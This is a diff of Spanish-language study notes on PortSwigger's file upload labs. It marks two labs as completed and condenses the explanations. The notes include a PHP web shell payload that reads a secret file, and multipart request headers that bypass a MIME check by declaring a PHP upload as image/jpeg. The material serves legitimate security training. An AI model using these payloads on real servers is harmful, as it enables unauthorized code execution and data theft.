@@ -2,21 +2,22 @@
 
 > **Método de estudio:** seguir primero el orden, conceptos y workflows oficiales de PortSwigger Web Security Academy. Los bypasses avanzados, payload collections y atajos de examen quedan separados en `Preparacion-Examen/`.
 
+## Estado del bloque
+
+**✅ File Upload Vulnerabilities — Apprentice completado.**
+
+Labs realizados:
+
+- ✅ Remote code execution via web shell upload.
+- ✅ Web shell upload via Content-Type restriction bypass.
+
+---
+
 ## Qué son las vulnerabilidades de File Upload
 
-Una vulnerabilidad de **file upload** aparece cuando una aplicación permite subir archivos al servidor sin validar correctamente aspectos como:
+Una vulnerabilidad de **file upload** aparece cuando una aplicación permite subir archivos al servidor sin validar correctamente aspectos como nombre, extensión, tipo MIME, contenido, tamaño, ubicación final o si el servidor ejecutará el archivo.
 
-- nombre;
-- extensión;
-- tipo MIME / `Content-Type`;
-- contenido;
-- tamaño;
-- ubicación final;
-- si el servidor ejecutará o interpretará el archivo.
-
-El riesgo más grave es que el servidor termine ejecutando un archivo controlado por el usuario.
-
-La idea central es:
+El riesgo más grave es:
 
 ```text
 usuario sube archivo
@@ -34,8 +35,6 @@ Remote Code Execution
 
 # Orden oficial en Server-side vulnerabilities — Apprentice
 
-PortSwigger incluye actualmente 9 elementos en este bloque:
-
 1. What are file upload vulnerabilities?
 2. How do file upload vulnerabilities arise?
 3. Exploiting unrestricted file uploads to deploy a web shell
@@ -46,58 +45,24 @@ PortSwigger incluye actualmente 9 elementos en este bloque:
 8. Flawed file type validation — Continued
 9. **Lab: Web shell upload via Content-Type restriction bypass**
 
-En este bloque Apprentice haremos **2 labs**.
-
 ---
 
-# 1. Unrestricted file upload
+# Lab 1 — Remote code execution via web shell upload ✅
 
-Si la aplicación permite subir un archivo ejecutable y después acceder a él por URL, el servidor puede llegar a ejecutar ese código.
+> [Procedimiento completo](../Labs/File-Upload/01-RCE-via-web-shell-upload.md)
 
-En los labs de PortSwigger el ejemplo típico usa PHP:
+Payload usado por PortSwigger:
 
 ```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
-La finalidad del payload es leer el archivo objetivo del lab.
-
-## Concepto de web shell
-
-Una **web shell** es un archivo ejecutable desde la web que permite ejecutar código en el servidor.
-
-En este bloque Apprentice no necesitamos todavía construir shells complejas. El objetivo es entender que un archivo PHP subido puede ejecutarse si:
+Workflow aprendido:
 
 ```text
-1. el servidor acepta el archivo;
-2. lo almacena en una ubicación accesible;
-3. esa ubicación interpreta PHP.
-```
-
----
-
-# Lab 1 — Remote code execution via web shell upload ✅
-
-> [Procedimiento completo paso a paso](../Labs/File-Upload/01-RCE-via-web-shell-upload.md)
-
-## Objetivo
-
-Subir un archivo PHP que lea:
-
-```text
-/home/carlos/secret
-```
-
-acceder al archivo subido y enviar el valor mediante **Submit solution**.
-
-## Qué enseña PortSwigger
-
-```text
-Upload de avatar
+Upload exploit.php
       ↓
-archivo PHP aceptado sin restricciones
-      ↓
-archivo guardado en /files/avatars/
+/files/avatars/exploit.php
       ↓
 GET al archivo
       ↓
@@ -106,118 +71,84 @@ servidor ejecuta PHP
 secret de Carlos
 ```
 
-Este lab enseña el caso más directo: **no hay que evadir validaciones**.
-
----
-
-# 2. Flawed file type validation
-
-Muchas aplicaciones intentan proteger la subida validando el tipo del archivo.
-
-Una comprobación común es mirar el header MIME de la parte multipart:
-
-```http
-Content-Type: image/jpeg
-```
-
-El problema es que este valor viene de la **request del cliente** y puede ser modificado.
-
-Ejemplo conceptual:
+La lección principal fue distinguir:
 
 ```text
-archivo = shell.php
-Content-Type = application/x-php
-        ↓
-rechazado
-
-archivo = shell.php
-Content-Type = image/jpeg
-        ↓
-aceptado si el servidor confía solo en ese header
-```
-
-El nombre del archivo sigue siendo `.php`; únicamente falsificamos el MIME declarado.
-
----
-
-# Lab 2 — Web shell upload via Content-Type restriction bypass ⏳
-
-> [Procedimiento completo paso a paso](../Labs/File-Upload/02-Web-shell-via-Content-Type-bypass.md)
-
-## Objetivo
-
-Subir el mismo tipo de archivo PHP, pero esta vez superar una validación que solo permite imágenes modificando:
-
-```http
-Content-Type: application/x-php
-```
-
-por:
-
-```http
-Content-Type: image/jpeg
-```
-
-## Flujo que debemos aprender
-
-```text
-upload shell.php
-        ↓
-server rechaza por MIME
-        ↓
-Burp Repeater
-        ↓
-Content-Type: image/jpeg
-        ↓
-server acepta
-        ↓
-GET /files/avatars/shell.php
-        ↓
-PHP ejecutado
+archivo subido correctamente
+≠
+archivo ejecutado correctamente
 ```
 
 ---
 
-# Multipart/form-data
+# Lab 2 — Web shell upload via Content-Type restriction bypass ✅
 
-Las subidas de archivos suelen usar requests como:
+> [Procedimiento completo](../Labs/File-Upload/02-Web-shell-via-Content-Type-bypass.md)
 
-```http
-POST /my-account/avatar HTTP/2
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
-```
+La aplicación valida el MIME declarado por el cliente.
 
-Dentro del body aparece una parte similar a:
+Request rechazada conceptualmente:
 
 ```http
 Content-Disposition: form-data; name="avatar"; filename="exploit.php"
 Content-Type: application/x-php
-
-<?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
-Debemos aprender a reconocer tres cosas:
+Bypass oficial:
+
+```http
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+```
+
+El nombre siguió siendo:
 
 ```text
-filename="exploit.php"     ← nombre/extensión
-Content-Type: ...          ← MIME declarado
-contenido del archivo      ← payload real
+exploit.php
 ```
+
+Luego se solicitó:
+
+```text
+/files/avatars/exploit.php
+```
+
+para ejecutar el PHP y recuperar el secret.
 
 ---
 
-# Qué mirar en Burp
+# Multipart/form-data aprendido
 
-En File Upload será especialmente importante:
+Debemos distinguir dos niveles de `Content-Type`.
+
+## Request completa
+
+```http
+Content-Type: multipart/form-data; boundary=...
+```
+
+## Parte del archivo
+
+```http
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: image/jpeg
+```
+
+En el segundo lab modificamos **el Content-Type de la parte del archivo**, no el `multipart/form-data` global.
+
+---
+
+# Qué aprendimos en Burp
 
 - `Proxy → HTTP history`;
 - localizar `POST /my-account/avatar`;
-- revisar el body `multipart/form-data`;
-- identificar `filename=`;
-- identificar el `Content-Type` de la parte del archivo;
+- leer `multipart/form-data`;
+- reconocer `filename=`;
+- reconocer el MIME de la parte del archivo;
 - `Send to Repeater`;
-- editar solo el dato que PortSwigger está enseñando;
-- localizar posteriormente el `GET /files/avatars/<archivo>`.
+- modificar solamente el MIME relevante;
+- localizar/crear `GET /files/avatars/exploit.php`;
+- interpretar la Response de ejecución.
 
 ---
 
@@ -226,64 +157,16 @@ En File Upload será especialmente importante:
 ```text
 ¿puedo subir un archivo?
         ↓
-¿qué restricciones existen?
+¿qué valida el servidor?
         ↓
-¿qué comprueba realmente el servidor?
-        ↓
-¿extensión? ¿MIME? ¿contenido?
-        ↓
-¿puedo controlar ese dato desde Burp?
+¿ese dato lo controla el cliente?
         ↓
 ¿dónde queda almacenado?
         ↓
-¿el servidor lo ejecuta cuando lo solicito?
+¿es accesible por URL?
+        ↓
+¿el servidor lo ejecuta o solo lo sirve como datos?
 ```
-
----
-
-# Diferencia importante: guardar vs ejecutar
-
-No basta con que un archivo se suba correctamente.
-
-```text
-archivo almacenado como texto
-→ no necesariamente RCE
-
-archivo almacenado + interpretado como PHP
-→ ejecución server-side
-```
-
-Por eso después de cada upload debemos comprobar **cómo sirve el servidor ese archivo**.
-
----
-
-# Qué NO mezclaremos todavía
-
-El learning path completo de File Upload contiene técnicas Practitioner y temas más avanzados como:
-
-- path traversal en el filename;
-- blacklist de extensiones;
-- `.htaccess`;
-- extensiones ofuscadas;
-- polyglot files;
-- validación del contenido;
-- race conditions;
-- PUT uploads.
-
-Los estudiaremos cuando PortSwigger los introduzca. No los usaremos para sustituir los workflows Apprentice.
-
----
-
-# Burp que debemos dominar en este bloque
-
-- [x] Reconocer `multipart/form-data`.
-- [x] Localizar la parte del archivo dentro del body.
-- [x] Identificar `filename=`.
-- [ ] Identificar el `Content-Type` de una parte multipart.
-- [ ] Enviar un upload a Repeater.
-- [ ] Modificar el MIME sin alterar innecesariamente el resto.
-- [x] Encontrar la URL final del archivo subido.
-- [x] Distinguir upload exitoso de ejecución exitosa.
 
 ---
 
@@ -293,11 +176,12 @@ Los estudiaremos cuando PortSwigger los introduzca. No los usaremos para sustitu
 - [x] Entiendo qué significa web shell.
 - [x] Entiendo por qué un `.php` puede producir RCE.
 - [x] Sé leer una request `multipart/form-data`.
-- [ ] Entiendo que `Content-Type` es controlable por el cliente.
-- [ ] Sé usar Repeater para modificar el MIME de una parte multipart.
-- [x] Sé encontrar y abrir el archivo subido.
+- [x] Entiendo que el `Content-Type` declarado es controlable por el cliente.
+- [x] Sé usar Repeater para modificar el MIME de una parte multipart.
+- [x] Sé encontrar y solicitar el archivo subido.
+- [x] Distingo upload exitoso de ejecución exitosa.
 - [x] Lab 1 completado.
-- [ ] Lab 2 completado.
+- [x] Lab 2 completado.
 
 ---
 
@@ -306,17 +190,15 @@ Los estudiaremos cuando PortSwigger los introduzca. No los usaremos para sustitu
 ## Lab 1 — Remote code execution via web shell upload
 
 - Estado: ✅ resuelto.
-- Objetivo: leer `/home/carlos/secret`.
-- Idea: upload PHP sin restricciones.
+- Concepto: upload sin restricciones + ejecución PHP.
 
 ## Lab 2 — Web shell upload via Content-Type restriction bypass
 
-- Estado: ⏳ en progreso.
-- Objetivo: leer `/home/carlos/secret`.
-- Técnica: modificar el MIME declarado a `image/jpeg`.
+- Estado: ✅ resuelto.
+- Concepto: validación débil basada en MIME controlable por el cliente.
 
 ---
 
 # Regla rápida
 
-**En File Upload no preguntarnos solo “¿me deja subirlo?”. También: “¿dónde lo guarda y qué hace el servidor cuando alguien solicita ese archivo?”.**
+**En File Upload no basta con preguntar “¿me deja subirlo?”. Hay que comprobar qué valida, dónde lo guarda y qué hace el servidor cuando solicitamos ese archivo.**
